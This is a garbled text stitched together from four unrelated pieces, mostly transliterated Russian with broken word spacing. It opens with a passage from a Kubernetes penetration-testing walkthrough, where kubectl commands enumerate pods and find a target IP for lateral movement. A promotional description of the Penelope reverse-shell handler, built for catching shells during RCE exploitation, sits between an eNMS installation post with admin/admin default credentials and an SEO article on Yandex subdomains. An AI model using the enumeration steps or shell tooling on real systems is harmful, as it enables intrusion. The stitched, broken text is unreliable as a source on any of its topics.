secrets -n kube- system Pro ver ka sek retovS sek retami ne poluchi los', pos motrim na pody. Kazh dyi pod sos toit iz odno go ili nes kol' kikh kon tei nerov, khra nili shcha, otdel' nogo IP-adre sa i optsii, kotorye opre delia iut, kak imen no kon tei nery dol zhny zapus kat' sia. Tak zhe pod pred stav liaet soboi nekii zapushchen nyi pro tsess v klas tere Kubernetes. No chashche vse go v podakh ispol' zuiut sia kon tei nery Docker. Pos motrim, mozhem li my poluchit' pody iz pros trans tva dev, a pos le polozhi tel' nogo otve ta poluchim ikh spi sok. kubectl auth can- i list pods -n dev kubectl get pods -n dev Po luche nie podov v pros trans tve devDa vai poluchim opi sanie poda. Tak kak eto tselyi kon tei ner, nam inte res na voz mozhnost' ras prostra neniia po seti, a iz opi saniia smo zhem uznat' adres. kubectl describe pod/ devnode- deployment- cd86fb5c- 6ms8d -n dev Opi sanie podaTak, iz opi saniia poda devnode-deployment-cd86fb5c-6ms8d my vidim adres 172.17.0.8 i otkry tyi port 3000. Oka zalos', chto tam rabota et takoi zhe ser vis, poeto mu my mozhem poluchit'

Postavil sebe vchera na test liubopytnuiu sistemu avtomatizatsii upravleniia setevymi ustroistvami - eNMS.    https://github.com/eNMS-automation/eNMS  https://www.enms.io/    Ia sam podobnye sistemy ne ekspluatiroval, no poslednee vremia prismatrivaius' i eto uzhe ne pervyi podobnyi produkt v pole moego zreniia. Tam ideia takaia. Vy dobavliaete setevye ustroistva, ukazyvaia ikh opisanie v vide raspolozheniia, geograficheskikh koordinat, ip adresa i t.d. Ustroistva avtomaticheski zanosiatsia na geograficheskuiu kartu. Mezhdu nimi nastraivaiutsia sviazi.    K ustroistvam mozhno podkliuchat'sia po ssh priamo cherez veb interfeis. Mozhno sozdavat' razlichnye zadachi v vide ansible pleibukov, bash skriptov ili kakikh-to eshche nastroek. Mozhno sozdavat' tak nazyvaemye workflow v vide posledovatel'nosti zadach s razlichnymi perekhodami v zavisimosti ot statusov vypolnennykh predydushchikh zadanii. Mozhno dobavliat' reguliarnye zadachi po raspisaniiu. Vsio eto mozhet byt' priviazano i zapushcheno na konkretnykh ustroistvakh.    V obshchem, tam mnogo vsego dlia avtomatizatsii. Est' vstroennaia sistema opoveshchenii i kontrolia dostupa na baze pol'zovatelei, grupp i rolei. Stavitsia vsio prosto. Ia na Ubuntu zapustil sleduiushchim obrazom:    # apt install git python3-pip  # git clone https://github.com/afourmy/eNMS.git  # cd eNMS  # pip3 install -r build/requirements/requirements.txt  # export FLASK_APP=app.py  # flask run --host=0.0.0.0    I dal'she zashel http://10.20.1.16:5000/, uchiotka admin / admin.  V sisteme uzhe budet demo nabor dannykh, tak chto mozhno srazu otsenit' vozmozhnosti i realizatsiiu.    U proekta neplokhaia dokumentatsiia - https://enms.readthedocs.io/en/develop/base/features.html No eto ne ta sistema, kotoruiu mozhno s pol tychka osvoit', nado razbirat'sia. V runete voobshche ne nashiol po nei informatsii. V gugle tol'ko obshchie slova. Na vid sistema ne plokha, s uchiotom togo, chto ona polnost'iu besplatnaia.

Penelope is an advanced shell handler. Its main aim is to replace netcat as shell catcher during exploiting RCE vulnerabilities.It works on Linux and macOS and the only requirement is Python3. It is one script without 3rd party dependencies and hopefully it will stay that way.Among the main features are:Auto-upgrade shells to PTY (auto-resize included)Logging interaction with the targetsDownload files from targetsUpload files to targetsUpload preset scripts to targetsSpawn backup shellsMultiple sessionsMultiple listenersCan be imported by exploits and get shell on the same terminal (see extras)Penelope can work in conjunction with metasploit exploits by disabling the default handler with set DisablePayloadHandler TrueIt supports Windows shells but autoupgrade is not implemented yet. However it can accept PTY shells from the excellent project ConPtyShell of @antonioCoco. Autoresize of PTY is implemented.Sample basic usagereverse shells on 0.0.0.0:4444penelope.py 5555              # Listening for reverse shells on 0... #penelope #simulation #socket #unix #windows

Zachem sozdavat' regional'nye poddomeny  Poiskovoi sisteme vazhno znat' geografiiu saita.  Esli vash sait rabotaet v odnom regione, <<podskazat'>> poiskovikam mozhno tak:  * dobavit' v Title, zagolovok H1 i v tekst zaprosy s regionom ili gorodom; * razmestit' na saite telefon s kodom goroda; * prisvoit' region v paneli Iandeks.Vebmastera.  No podobnye metody ne podoidut dlia ploshchadok, kotorye rabotaiut po vsei Rossii, naprimer, marketpleisov, internet-magazinov, kompanii-riteilerov. Prichiny:  * Iandeks.Spravochniku nuzhny adres i telefon s kodom goroda; * v paneli Iandeks.Vebmastera odnomu saitu mozhno prisvoit' tol'ko odin region.  Poskol'ku kazhdyi poddomen - eto po faktu otdel'nyi sait, dostatochno sozdat' regional'nye poddomeny, chtoby reshit' takie voprosy:  * Ukazanie geografii saita dlia poiskovikov. * V Title, zagolovok H1 i tekst kartochek tovarov mozhno dobavit' raznye regiony za schet togo, chto na raznykh poddomenakh nakhodiatsia otdel'nye stranitsy dlia odinakovykh tovarov. * Zapis' v Iandeks.Spravochnike. Esli vnesti tuda kazhdyi poddomen, to snippet saita v otdel'no vziatom regione obzavedetsia poleznymi kontaktami (adres, telefon, sait). I kompaniiu legche budet naiti na karte oblasti ili goroda.  Kak nastraivat' poddomeny, chitaite v stat'e (https://searchengines.guru/ru/articles/1060068).  Poshagovaia instruktsiia po dobavleniiu poddomenov v panel' vebmastera Iandeks  Dobavlenie 170 i bolee poddomenov mozhet zaniat' 3-5 chasov. Avtomatizatsiia zhe protsessa po nashei skheme pomozhet vypolnit' rabotu primerno za 30 minut.  Vazhno! Chtoby nasha instruktsiia rabotala, podtverdite osnovnoi domen s pomoshch'iu html-faila. Eto pozvolit dobavliat' poddomeny po uproshchennoi skheme - podtverzhdat' prava na nikh po sozdannomu failu.  Dlia dobavleniia regional'nykh poddomenov v panel' Iandeks.Vebmastera vypolnite takie shagi:  * Ustanovite Python dlia Windows po ssylke https://www.python.org/downloads/. * Skachaite i ustanovite brauzer Chrome https://www.google.ru/chrome/. * Pereidite na chrome://version/ i zapomnite versiiu.  (https://mellodesign.ru/wp-content/uploads/2021/08/image4-2.png)  * Skachaite skript. (https://mello.gumroad.com/l/Jqwsh) * Vyberite nuzhnuiu versiiu i skachaite draiver (https://chromedriver.chromium.org/downloads) pod vashu sistemu.  (https://mellodesign.ru/wp-content/uploads/2021/08/image2-1.png)  * Dobav'te draiver v papku so skriptom.  (https://mellodesign.ru/wp-content/uploads/2021/08/image5.png)  * Zapolnite domeny po shablonu (https://docs.google.com/spreadsheets/d/1b_8juKt7tKxFNbimG2B90KS8T9Ac6NH6ltacamFvsa8/edit?usp=sharing). * V papku so skriptom dobav'te domeny i dostupy failom host.csv.  (https://mellodesign.ru/wp-content/uploads/2021/08/image1-1.png)  * V macOs zapustite skript run.sh (http://run.sh). Esli ne znaete kak, vospol'zuites' instruktsiei (https://www.technodor.info/2020/04/shell-sh-macos.html). Na Windows zapustite run.bat. * Ustanovite zavisimosti v terminale - naberite pip3 install -r requirements.txt, nakhodias' v direktorii failom requirements.txt.  (https://mellodesign.ru/wp-content/uploads/2021/08/image3-1.png)  Zapustite terminal, naberite tam python3 main.py, nakhodias' v direktorii failom main.p.  Vyvody  Avtomatizatsiia tipovykh protsessov aktual'na dlia SEO-spetsialistov. V Mello my s komandoi stremimsia avtomatizirovat' kak mozhno bol'she operatsii. Eto pozvoliaet izbavit'sia ot rutinnykh i neinteresnykh zadach, a eshche vypolniat' rabotu bystree, ne teriaia kachestva.  Podderzhka po realizatsii dannoi instruktsii ne osushchestvliaetsia
